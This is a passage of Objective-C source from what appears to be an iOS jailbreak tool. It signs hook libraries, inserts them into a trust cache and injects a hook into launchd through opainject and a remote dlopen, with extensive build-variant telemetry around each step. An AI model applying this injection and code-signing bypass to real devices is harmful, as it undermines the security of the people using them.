    dt699_stage("BUILD102738P_REMOTE_DLOPEN_IMPLEMENTATION_CHANGED=NO");
    dt699_stage("BUILD102738P_PTE_HANDOFF_PROTOCOL_CHANGED=NO");
    dt699_stage("BUILD102732C_SCOPE=LAUNCHD_GOT_PROTECTION_ONLY");
    dt699_stage("COMPILED_SCOPE_MARKER=LAUNCHD_GOT_PROTECTION_ONLY");
#elif DT_BUILD_NUM == 102736
    dt699_stage("BUILD102736C_BEGIN");
    dt699_stage("BUILD102736C_SCOPE=OPAINJECT_TASK_PORT_ACQUISITION_REPAIR");
    dt699_stage("BUILD102732C_SCOPE=OPAINJECT_TASK_PORT_ACQUISITION_REPAIR");
    dt699_stage("COMPILED_SCOPE_MARKER=OPAINJECT_TASK_PORT_ACQUISITION_REPAIR");
#elif DT_BUILD_NUM == 102734
    dt699_stage("BUILD102734C_BEGIN");
    dt699_stage("BUILD102734C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY_OPAINJECT_TASKPORT_REPAIR");
    dt699_stage("BUILD102732C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY_OPAINJECT_TASKPORT_REPAIR");
    dt699_stage("COMPILED_SCOPE_MARKER=CONSTRUCTOR_BOOMERANG_ONLY_OPAINJECT_TASKPORT_REPAIR");
#elif DT_BUILD_NUM == 102733
    dt699_stage("BUILD102732C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY_VALIDATOR_FIX");
    dt699_stage("COMPILED_SCOPE_MARKER=CONSTRUCTOR_BOOMERANG_ONLY_VALIDATOR_FIX");
#else
    dt699_stage("BUILD102732C_SCOPE=CONSTRUCTOR_BOOMERANG_ONLY");
    dt699_stage("COMPILED_SCOPE_MARKER=CONSTRUCTOR_BOOMERANG_ONLY");
#endif
    dt699_stage("BUILD102724_PHASE_B_REACHABLE=NO");
    dt699_stage("PHASE_B_LAUNCHD_TEST=NOT_RUN");
    dt102732c_emit_preserved_system_markers();
#if DT_BUILD_NUM != 102738
    dt102732c_emit_no_mutation_markers();
#endif

#if DT_BUILD_NUM == 102734
    if (dt102734c_verify_bundle_resource_identity() != 0)
        return dt102732c_finish(verdictOut, "BUNDLE_RESOURCE_IDENTITY_FAIL", -73401);
#endif

    dt710_log_preboot_paths(log);
#if DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage("BUILD102735D_VAR_JB_COMPAT_LOG_SKIPPED=YES");
#else
    dt710_log_var_jb_compat_state(log);
#endif
    if (!dt710_verify_path_coherence(log)) {
        return dt102732c_finish(verdictOut, "STAGING_FAIL", -73201);
    }
    if (dt102721_run_preboot_rw_gate(log, verdictOut, &preboot_rw_confirmed) != 0) {
        return dt102732c_finish(verdictOut, "STAGING_FAIL", -73202);
    }
    if (dt681_stage_handoff_basebin(log) != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "STAGING_FAIL", -73203);
    }
#if defined(DT_ROOTLESS_R24)
    if (dt_r24_verify_d0_handoff_identity() != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "D0_IDENTITY_FAIL", -73204);
    }
#endif
#if DT_BUILD_NUM == 102734
    if (dt102734c_verify_stage_copy_identity() != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "STAGE_COPY_IDENTITY_FAIL", -73402);
    }
#elif DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    if (dt102735d_trace_preflight(&trace_ctx, log) != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
        return dt102732c_finish(verdictOut, "TRACE_PREFLIGHT_FAIL", -73701);
#elif DT_BUILD_NUM == 102736
        return dt102732c_finish(verdictOut, "TRACE_PREFLIGHT_FAIL", -73601);
#else
        return dt102732c_finish(verdictOut, "TRACE_PREFLIGHT_FAIL", -73501);
#endif
    }
    NSError *runtimeTraceError = nil;
    if (![[DTRunLogger shared] prepareRuntimeTraceForInjection:&runtimeTraceError]) {
        dt102735d_boomerang_log(log, [NSString stringWithFormat:
            @"R24_FAIL_STAGE=RUNTIME_TRACE_PREFLIGHT error=%@",
            runtimeTraceError.localizedDescription ?: @"unknown"]);
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "RUNTIME_TRACE_PREFLIGHT_FAIL", -73824);
    }
#endif

    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_STAGE_PATH=%@",
        dt710_resolve_basebin_path() ?: @"UNAVAILABLE"] UTF8String]);
#ifdef DT_ROOTLESS_R4
    dt699_stage("BUILD102732C_STAGE_LAUNCHDHOOK_SOURCE_ROLE=ROOTLESS_R6_FULLER_HOOK");
    dt699_stage("BUILD102732C_STAGE_LIBJAILBREAK_SOURCE_ROLE=ROOTLESS_R6_FULLER_HOOK");
    dt699_stage("BUILD102732C_STAGE_LIBCHOMA_SOURCE_ROLE=ROOTLESS_R6_FULLER_HOOK");
#else
    dt699_stage("BUILD102732C_STAGE_LAUNCHDHOOK_SOURCE_ROLE=GATE1B1_HANDOFF");
    dt699_stage("BUILD102732C_STAGE_LIBJAILBREAK_SOURCE_ROLE=GATE1B1_HANDOFF");
    dt699_stage("BUILD102732C_STAGE_LIBCHOMA_SOURCE_ROLE=GATE1B1_HANDOFF");
#endif

    dt102732c_artifact_t artifacts[3] = {
        { "LAUNCHDHOOK", "LAUNCHDHOOK", "launchdhook516.dylib", dt710_resolve_hook_path(), {0} },
        { "LIBJAILBREAK", "LIBJAILBREAK", "libjailbreak.dylib", dt710_resolve_libjailbreak_path(), {0} },
        { "LIBCHOMA", "LIBCHOMA", "libchoma.dylib", dt710_resolve_libchoma_path(), {0} },
    };

    for (size_t i = 0; i < 3; i++) {
        if (dt102732c_sign_artifact(&artifacts[i], log) != 0) {
            dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
            return dt102732c_finish(verdictOut, "SIGNING_FAIL", -73210 - (int)i);
        }
    }

    if (dt102732c_dependency_gate(artifacts) != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "DEPENDENCY_GATE_FAIL", -73220);
    }

    if (dt102732c_trust_trio(artifacts) != 0) {
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "TRUSTCACHE_FAIL", -73230);
    }

    if (dt681_boomerang_start(&boomerang, log) != 0) {
        dt699_stage("BUILD102732C_BOOMERANG_SERVER_READY=NO");
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "BOOMERANG_SERVER_PREP_FAIL", -73240);
    }
    boomerang_started = YES;
    dt699_stage("BUILD102732C_BOOMERANG_SERVER_READY=YES");
    dt699_stage("BUILD102732C_REGISTERED_PORT_COUNT=3");
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_REGISTERED_PORT2=%u",
        boomerang.serverPort] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_REGISTERED_PORT2_VALID=%@",
        boomerang.serverPort != MACH_PORT_NULL ? @"YES" : @"NO"] UTF8String]);

    NSString *stashVerdict = nil;
    int stash_r = dt681_kcall_stash_boomerang_port(boomerang.serverPort, log, &stashVerdict);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_PORTS_REGISTER_RESULT=%d",
        stash_r] UTF8String]);
    if (stash_r != 0) {
        dt681_boomerang_cleanup(&boomerang);
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "REGISTERED_PORT_FAIL", -73241);
    }

    if (dt102732c_wall2_authorize_trio(artifacts, log, &wall2) != 0) {
        if (wall2.active)
            (void)dt102732c_restore_wall2(&wall2, log);
        if (wall2.launchd_proc)
            proc_rele(wall2.launchd_proc);
        dt681_boomerang_cleanup(&boomerang);
        dt102721_emit_post_rw_failure_policy(preboot_rw_confirmed);
        return dt102732c_finish(verdictOut, "WALL2_APPLY_FAIL", -73250);
    }
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    wall2_apply_ts = [[NSDate date] timeIntervalSince1970];
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_APPLY_TIMESTAMP=%.3f",
        wall2_apply_ts] UTF8String]);
#endif

    pid1_before = dt102732c_pid1_proc_snapshot();
    NSString *injectCapture = nil;
    int inject_r = dt681_spawn_opainject_launchd(dt710_resolve_hook_path().fileSystemRepresentation,
        log, &injectCapture);
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    remote_return_ts = [[NSDate date] timeIntervalSince1970];
    wall2_restore_begin_ts = remote_return_ts;
    restore_r_102737 = dt102732c_restore_wall2(&wall2, log);
    wall2_restore_end_ts = [[NSDate date] timeIntervalSince1970];
    if (wall2.launchd_proc)
        proc_rele(wall2.launchd_proc);
    wall2.launchd_proc = 0;
#endif
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_OPAINJECT_RC=%d", inject_r] UTF8String]);
    dt102732c_reemit_hook_capture(injectCapture);
#if DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    int remote_dlopen_rc = dt102735d_extract_remote_dlopen_rc(injectCapture);
    if (remote_dlopen_rc == INT_MIN)
        remote_dlopen_rc = inject_r == 0 ?
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            -73770
#else
            -73570
#endif
            : inject_r;
    dt699_stage([[NSString stringWithFormat:@"BUILD102735D_REMOTE_DLOPEN_RC=%d",
        remote_dlopen_rc] UTF8String]);
#if DT_BUILD_NUM == 102736
    dt699_stage([[NSString stringWithFormat:@"BUILD102736C_REMOTE_DLOPEN_RC=%d",
        remote_dlopen_rc] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_REMOTE_DLOPEN_RC=%d",
        remote_dlopen_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_REMOTE_DLOPEN_RETURN_TIMESTAMP=%.3f",
        remote_return_ts] UTF8String]);
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_REMOTE_DLOPEN_RC=%d",
        remote_dlopen_rc] UTF8String]);
#endif
#endif
#endif

#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    {
        dt102735d_trace_observation_t trace_obs = {0};
        trace_obs.boomerang_wait_rc = -1;
        const char *trace_result = "INCONCLUSIVE";
        int trace_rc = -73780;

        dt699_stage([[NSString stringWithFormat:
            @"BUILD102737D_WALL2_RESTORE_BEGIN_TIMESTAMP=%.3f",
            wall2_restore_begin_ts] UTF8String]);
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102737D_WALL2_RESTORE_END_TIMESTAMP=%.3f",
            wall2_restore_end_ts] UTF8String]);

        if (restore_r_102737 == 0 && inject_r == 0 && remote_dlopen_rc == 0) {
            dt699_stage([[NSString stringWithFormat:
                @"BUILD102737D_OBSERVATION_WINDOW_BEGIN_TIMESTAMP=%.3f",
                [[NSDate date] timeIntervalSince1970]] UTF8String]);
            (void)dt102735d_poll_trace_and_boomerang(&trace_ctx, &boomerang, log,
                &trace_obs);
            trace_result = dt102737d_classify_result(remote_dlopen_rc, &trace_obs,
                &boomerang);
            trace_rc =
#if DT_BUILD_NUM == 102738
#ifdef DT_BUILD102739C_VARIANT
                strcmp(trace_result, "GOT_WRAPPER_PERSISTENT_INSTALL_PASS") == 0
                    ? 0 : -73980;
#elif defined(DT_BUILD102739B_VARIANT)
                strcmp(trace_result, "GOT_WRAPPER_PERSISTENT_INSTALL_PASS") == 0
                    ? 0 : -73980;
#elif defined(DT_BUILD102739A_VARIANT)
                strcmp(trace_result, "GOT_WRAPPER_PERSISTENT_INSTALL_PASS") == 0
                    ? 0 : -73980;
#elif defined(DT_BUILD102738Z_VARIANT)
                strcmp(trace_result, "GOT_WRAPPER_PERSISTENT_INSTALL_PASS") == 0
                    ? 0 : -73880;
#elif defined(DT_BUILD102738Y_VARIANT)
                strcmp(trace_result, "GOT_WRAPPER_INVOCATION_PROOF_PASS") == 0
                    ? 0 : -73880;
#elif defined(DT_BUILD102738X_VARIANT)
                strcmp(trace_result, "GOT_WRAPPER_ROUNDTRIP_PASS") == 0 ? 0 : -73880;
#elif defined(DT_BUILD102738W_VARIANT)
                strcmp(trace_result, "GOT_SAME_VALUE_STORE_PASS") == 0 ? 0 : -73880;
#else
                strcmp(trace_result, "GOT_PROTECTION_ONLY_PASS") == 0 ? 0 : -73880;
#endif
#else
                strcmp(trace_result, "CONSTRUCTOR_BOOMERANG_ONLY_PASS") == 0 ? 0 : -73780;
#endif
        } else {
            trace_result = "INCONCLUSIVE";
            trace_rc = -73770;
        }

#ifdef DT_ROOTLESS_R4
        /*
         * R9: classify() still requires GOT_WRAPPER_PERSISTENT_INSTALL_PASS
         * (old GOT XPC-wrapper architecture). Shared with HOST_SIM via
         * dt_rootless_r9_ctor_product_ok().
         */
        dt_rootless_r9_ctor_inputs_t r9_in = {
            .restore_r = restore_r_102737,
            .inject_r = inject_r,
            .remote_dlopen_rc = remote_dlopen_rc,
            .boomerang_wait_rc = trace_obs.boomerang_wait_rc,
            .ctor_return_pass = trace_obs.ctor_return_pass,
            .ctor_exit_reached = trace_obs.ctor_exit_reached,
            .primitives_init_pass = trace_obs.primitives_init_pass,
            .boomerang_done_send_pass = trace_obs.boomerang_done_send_pass,
            .got_probe_terminal_pass = trace_obs.got_probe_terminal_pass,
            .got_restore_pass = trace_obs.got_restore_pass,
            .got_restore_fatal = trace_obs.got_restore_fatal,
        };
        BOOL r9_ctor_product_ok = dt_rootless_r9_ctor_product_ok(&r9_in);
        dt699_stage("ROOTLESS_R9_POST_DEP_PRE_FRESH_BEGIN");
        dt699_stage([[NSString stringWithFormat:
            @"ROOTLESS_R9_CTOR_WALL2_PRODUCT=%@",
            r9_ctor_product_ok ? @"PASS" : @"FAIL"] UTF8String]);
        dt699_stage("ROOTLESS_PRODUCT_EXECUTES_J_CONTROLLED_REPLY_TEST=NO");
        dt699_stage("ROOTLESS_PRODUCT_REQUIRES_ROOTFUL_WRAPPER_STORE=NO");
        dt699_stage("ROOTLESS_PRODUCT_REQUIRES_ROOTFUL_PERSISTENT_INSTALL=NO");
        dt699_stage("J_CONTROLLED_REPLY_REQUIRED_BY_CURRENT_ROOTLESS=NO");
        dt699_stage("J_FAILURE_IS_LEGACY_TELEMETRY_EXPECTATION=YES");
        dt699_stage([[NSString stringWithFormat:
            @"ROOTLESS_R9_CLASSIFY_TRACE_RC=%d result=%s",
            trace_rc, trace_result ? trace_result : "nil"] UTF8String]);
#endif

#ifdef DT_BUILD102739C_VARIANT
        int observer_r_102739c = -1;
        dt102739c_output_telemetry_t observer_telemetry_102739c = {0};
        BOOL observer_telemetry_parsed_102739c = NO;
#ifdef DT_BUILD102739D_VARIANT
        uint64_t trigger_entry_delta_102739d = 0;
        uint64_t trigger_return_delta_102739d = 0;
        uint64_t trigger_success_object_delta_102739d = 0;
        int trigger_send_rc_102739d = INT_MIN;
        BOOL trigger_delta_parsed_102739d = NO;
#ifdef DT_BUILD102739E_VARIANT
        uint64_t dictionary_delta_102739e = 0;
        uint64_t envelope_delta_102739e = 0;
        uint64_t exact_probe_delta_102739e = 0;
        BOOL classifier_delta_parsed_102739e = NO;
#endif
#ifdef DT_BUILD102739F_VARIANT
        uint64_t domain_nonzero_delta_102739f = 0;
        uint64_t systemwide_domain_delta_102739f = 0;
        uint64_t audit_token_delta_102739f = 0;
        BOOL identity_delta_parsed_102739f = NO;
        BOOL token_pid_match_102739f = NO;
        BOOL token_euid_match_102739f = NO;
#ifdef DT_BUILD102739G_VARIANT
        uint64_t resolution_deltas_102739g[8] = {0};
        BOOL resolution_delta_parsed_102739g = NO;
#ifdef DT_BUILD102739H_VARIANT
        uint64_t argument_deltas_102739h[11] = {0};
        BOOL argument_delta_parsed_102739h = NO;
#ifdef DT_BUILD102739I_VARIANT
        uint64_t handler_deltas_102739i[9] = {0};
        BOOL handler_delta_parsed_102739i = NO;
#ifdef DT_BUILD102739J_VARIANT
        BOOL direct_j_verdict_parsed_102739j = NO;
#endif
#endif
#endif
#endif
#endif
#endif
        NSTimeInterval observer_begin_102739c = [[NSDate date] timeIntervalSince1970];
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739C_OBSERVER_BEGIN_TIMESTAMP=%.3f", observer_begin_102739c]
            UTF8String]);
        if (restore_r_102737 == 0 && trace_rc == 0) {
#ifdef DT_ROOTLESS_R4
            dt699_stage("ROOTLESS_R9_JKCD_OBSERVER_SKIPPED_PRODUCT");
            observer_r_102739c = 0;
#else
            NSString *observerCapture = nil;
            observer_r_102739c = dt681_observe_launchd_output_telemetry(
                dt710_resolve_hook_path().fileSystemRepresentation, log, &observerCapture);
            observer_telemetry_parsed_102739c = dt102739c_extract_output_telemetry(
                observerCapture, &observer_telemetry_102739c);
#ifdef DT_BUILD102739D_VARIANT
            trigger_delta_parsed_102739d = dt102739d_extract_trigger_deltas(
                observerCapture, &trigger_entry_delta_102739d,
                &trigger_return_delta_102739d,
                &trigger_success_object_delta_102739d, &trigger_send_rc_102739d);
#ifdef DT_BUILD102739E_VARIANT
            classifier_delta_parsed_102739e = dt102739e_extract_classifier_deltas(
                observerCapture, &dictionary_delta_102739e,
                &envelope_delta_102739e, &exact_probe_delta_102739e);
#endif
#ifdef DT_BUILD102739F_VARIANT
            identity_delta_parsed_102739f = dt102739f_extract_identity_deltas(
                observerCapture, &dictionary_delta_102739e,
                &envelope_delta_102739e, &exact_probe_delta_102739e,
                &domain_nonzero_delta_102739f, &systemwide_domain_delta_102739f,
                &audit_token_delta_102739f, &token_pid_match_102739f,
                &token_euid_match_102739f);
#ifdef DT_BUILD102739G_VARIANT
            resolution_delta_parsed_102739g = dt102739g_extract_resolution_deltas(
                observerCapture, resolution_deltas_102739g);
#ifdef DT_BUILD102739H_VARIANT
            argument_delta_parsed_102739h = dt102739h_extract_argument_deltas(
                observerCapture, argument_deltas_102739h);
#ifdef DT_BUILD102739I_VARIANT
            handler_delta_parsed_102739i = dt102739i_extract_handler_deltas(
                observerCapture, handler_deltas_102739i);
#ifdef DT_BUILD102739J_VARIANT
            direct_j_verdict_parsed_102739j =
                [observerCapture containsString:
                    @"BUILD102739J_CONTROLLED_REPLY_ROUNDTRIP=PASS"];
#endif
#endif
#endif
#endif
#endif
#endif
#endif
        } else {
#ifdef DT_ROOTLESS_R4
            dt699_stage("ROOTLESS_R9_JKCD_OBSERVER_SKIPPED_PRODUCT");
            observer_r_102739c = 0;
#else
            dt699_stage("BUILD102739C_OBSERVER_SKIPPED_PREREQUISITE_FAIL");
#endif
        }
        NSTimeInterval observer_end_102739c = [[NSDate date] timeIntervalSince1970];
        BOOL observer_after_restore_102739c =
            observer_begin_102739c >= wall2_restore_end_ts;
        BOOL invariants_102739c = observer_telemetry_parsed_102739c
            && observer_telemetry_102739c.return_count
                <= observer_telemetry_102739c.entry_count
            && observer_telemetry_102739c.success_return_count
                <= observer_telemetry_102739c.return_count
            && observer_telemetry_102739c.xout_argument_count
                <= observer_telemetry_102739c.return_count
            && observer_telemetry_102739c.success_xout_count
                <= observer_telemetry_102739c.success_return_count
            && observer_telemetry_102739c.success_xout_count
                <= observer_telemetry_102739c.xout_argument_count
            && observer_telemetry_102739c.success_object_count
                <= observer_telemetry_102739c.success_xout_count;
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739C_OBSERVER_END_TIMESTAMP=%.3f", observer_end_102739c]
            UTF8String]);
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739C_OBSERVER_AFTER_WALL2_RESTORE=%s",
            dt102735d_yesno(observer_after_restore_102739c)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_OBSERVER_RC=%d",
            observer_r_102739c] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_TELEMETRY_PARSED=%s",
            dt102735d_yesno(observer_telemetry_parsed_102739c)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_ENTRY_COUNT=%llu",
            (unsigned long long)observer_telemetry_102739c.entry_count] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_RETURN_COUNT=%llu",
            (unsigned long long)observer_telemetry_102739c.return_count] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_SUCCESS_RETURN_COUNT=%llu",
            (unsigned long long)observer_telemetry_102739c.success_return_count] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_XOUT_ARGUMENT_COUNT=%llu",
            (unsigned long long)observer_telemetry_102739c.xout_argument_count] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_SUCCESS_XOUT_COUNT=%llu",
            (unsigned long long)observer_telemetry_102739c.success_xout_count] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_SUCCESS_OBJECT_COUNT=%llu",
            (unsigned long long)observer_telemetry_102739c.success_object_count] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739C_COUNTER_INVARIANTS=%s",
            dt102735d_yesno(invariants_102739c)] UTF8String]);
        BOOL output_contract_pass_102739c = restore_r_102737 == 0 && trace_rc == 0
            && observer_after_restore_102739c && observer_r_102739c == 0
            && invariants_102739c
            && observer_telemetry_102739c.success_object_count > 0;
#ifndef DT_ROOTLESS_R4
        if (output_contract_pass_102739c) {
            trace_result = "XPC_OUTPUT_CONTRACT_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739C_XPC_OUTPUT_CONTRACT=PASS");
        } else if (observer_r_102739c == 17
            && observer_telemetry_parsed_102739c && invariants_102739c) {
            trace_result = "XPC_OUTPUT_CONTRACT_INCONCLUSIVE";
            trace_rc = -73937;
            dt699_stage("BUILD102739C_XPC_OUTPUT_CONTRACT=INCONCLUSIVE");
        } else if (restore_r_102737 == 0 && trace_rc == 0) {
            trace_result = "XPC_OUTPUT_CONTRACT_OBSERVER_FAIL";
            trace_rc = -73938;
            dt699_stage("BUILD102739C_XPC_OUTPUT_CONTRACT=FAIL");
        }
#else
        dt699_stage("BUILD102739C_XPC_OUTPUT_CONTRACT=SKIPPED_PRODUCT");
#endif
#ifdef DT_BUILD102739D_VARIANT
        BOOL trigger_return_pass_102739d = trigger_delta_parsed_102739d
            && trigger_entry_delta_102739d > 0
            && trigger_return_delta_102739d == trigger_entry_delta_102739d;
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_TRIGGER_DELTA_PARSED=%s",
            dt102735d_yesno(trigger_delta_parsed_102739d)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_TRIGGER_SEND_RC=%d",
            trigger_send_rc_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_ENTRY_DELTA=%llu",
            (unsigned long long)trigger_entry_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_RETURN_DELTA=%llu",
            (unsigned long long)trigger_return_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_SUCCESS_OBJECT_DELTA=%llu",
            (unsigned long long)trigger_success_object_delta_102739d] UTF8String]);
#ifdef DT_BUILD102739E_VARIANT
#ifdef DT_BUILD102739F_VARIANT
        BOOL identity_pass_102739f = trigger_return_pass_102739d
            && identity_delta_parsed_102739f
            && dictionary_delta_102739e >= 1
            && envelope_delta_102739e >= 1
            && exact_probe_delta_102739e == 1
            && domain_nonzero_delta_102739f == 1
            && systemwide_domain_delta_102739f == 1
            && audit_token_delta_102739f == 1
            && token_pid_match_102739f
            && token_euid_match_102739f;
#ifdef DT_BUILD102739J_VARIANT
        NSString *identityBuildPrefix = @"BUILD102739J";
#elif defined(DT_BUILD102739I_VARIANT)
        NSString *identityBuildPrefix = @"BUILD102739I";
#elif defined(DT_BUILD102739H_VARIANT)
        NSString *identityBuildPrefix = @"BUILD102739H";
#elif defined(DT_BUILD102739G_VARIANT)
        NSString *identityBuildPrefix = @"BUILD102739G";
#else
        NSString *identityBuildPrefix = @"BUILD102739F";
#endif
        dt699_stage([[NSString stringWithFormat:@"%@_TRIGGER_DELTA_PARSED=%s", identityBuildPrefix,
            dt102735d_yesno(trigger_delta_parsed_102739d)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_IDENTITY_DELTA_PARSED=%s", identityBuildPrefix,
            dt102735d_yesno(identity_delta_parsed_102739f)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_TRIGGER_SEND_RC=%d", identityBuildPrefix,
            trigger_send_rc_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_ENTRY_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)trigger_entry_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_RETURN_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)trigger_return_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_SUCCESS_OBJECT_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)trigger_success_object_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_DICTIONARY_OBJECT_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)dictionary_delta_102739e] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_DOMAIN_ACTION_ENVELOPE_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)envelope_delta_102739e] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_EXACT_CONTROLLED_PROBE_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)exact_probe_delta_102739e] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_DOMAIN_NONZERO_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)domain_nonzero_delta_102739f] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_SYSTEMWIDE_DOMAIN_CANDIDATE_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)systemwide_domain_delta_102739f] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_AUDIT_TOKEN_CAPTURE_DELTA=%llu", identityBuildPrefix,
            (unsigned long long)audit_token_delta_102739f] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_TOKEN_PID_MATCH=%s", identityBuildPrefix,
            dt102735d_yesno(token_pid_match_102739f)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"%@_TOKEN_EUID_MATCH=%s", identityBuildPrefix,
            dt102735d_yesno(token_euid_match_102739f)] UTF8String]);
#ifdef DT_BUILD102739G_VARIANT
        BOOL resolution_pass_102739g = identity_pass_102739f
            && resolution_delta_parsed_102739g
            && resolution_deltas_102739g[0] == 1
            && resolution_deltas_102739g[1] == 1
            && resolution_deltas_102739g[2] == 1
            && resolution_deltas_102739g[3] == 1
            && resolution_deltas_102739g[4] == 1
            && resolution_deltas_102739g[5] == 1
            && resolution_deltas_102739g[6] == 1
#ifdef DT_BUILD102739I_VARIANT
            && resolution_deltas_102739g[7] == 1;
#else
            && resolution_deltas_102739g[7] == 0;
#endif
#ifdef DT_BUILD102739J_VARIANT
        NSString *resolutionBuildPrefix = @"BUILD102739J";
#elif defined(DT_BUILD102739I_VARIANT)
        NSString *resolutionBuildPrefix = @"BUILD102739I";
#elif defined(DT_BUILD102739H_VARIANT)
        NSString *resolutionBuildPrefix = @"BUILD102739H";
#else
        NSString *resolutionBuildPrefix = @"BUILD102739G";
#endif
        dt699_stage([[NSString stringWithFormat:@"%@_RESOLUTION_DELTA_PARSED=%s", resolutionBuildPrefix,
            dt102735d_yesno(resolution_delta_parsed_102739g)] UTF8String]);
        NSString *resolutionNames[] = {
            @"DOMAIN_RESOLUTION_ATTEMPT", @"DOMAIN_RESOLUTION_SUCCESS",
            @"PERMISSION_CHECK", @"PERMISSION_ALLOW", @"ACTION_NONZERO",
            @"ACTION_RESOLUTION_ATTEMPT", @"ACTION_RESOLUTION_SUCCESS",
            @"HANDLER_INVOCATION",
        };
        for (NSUInteger i = 0; i < 8; i++) {
            dt699_stage([[NSString stringWithFormat:@"%@_%@_DELTA=%llu", resolutionBuildPrefix,
                resolutionNames[i], (unsigned long long)resolution_deltas_102739g[i]] UTF8String]);
        }
#ifdef DT_BUILD102739H_VARIANT
        BOOL argument_pass_102739h = resolution_pass_102739g
            && argument_delta_parsed_102739h;
        for (NSUInteger i = 0; i < 11; i++) {
            argument_pass_102739h = argument_pass_102739h
                && argument_deltas_102739h[i] == 1;
        }
        NSString *argumentBuildPrefix =
#ifdef DT_BUILD102739J_VARIANT
            @"BUILD102739J";
#elif defined(DT_BUILD102739I_VARIANT)
            @"BUILD102739I";
#else
            @"BUILD102739H";
#endif
        dt699_stage([[NSString stringWithFormat:@"%@_ARGUMENT_DELTA_PARSED=%s",
            argumentBuildPrefix,
            dt102735d_yesno(argument_delta_parsed_102739h)] UTF8String]);
        NSString *argumentNames[] = {
            @"HANDLER_POINTER_CAPTURE", @"HANDLER_POINTER_NONNULL",
            @"ARGS_ZERO_INITIALIZED", @"ARGSOUT_ZERO_INITIALIZED",
            @"ARG_DESCRIPTOR_SCAN", @"ARG_NAME_ROOT_PATH",
            @"ARG_TYPE_STRING", @"ARG_DIRECTION_OUT",
